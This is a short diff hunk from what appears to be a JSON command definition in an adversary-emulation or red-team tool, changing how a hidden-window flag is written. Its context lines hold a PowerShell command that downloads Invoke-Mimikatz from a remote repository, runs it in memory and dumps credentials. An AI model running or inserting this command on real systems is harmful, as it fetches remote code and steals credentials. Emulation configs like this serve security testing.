@@ -22,7 +22,8 @@
     "commands": [
       "powershell.exe",
       "-nop",
-      "-w 0",
+      "-WindowStyle",
+      "0",
       "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');",
       "Invoke-Mimikatz",
       "{{DumpCreds.Flag}}",
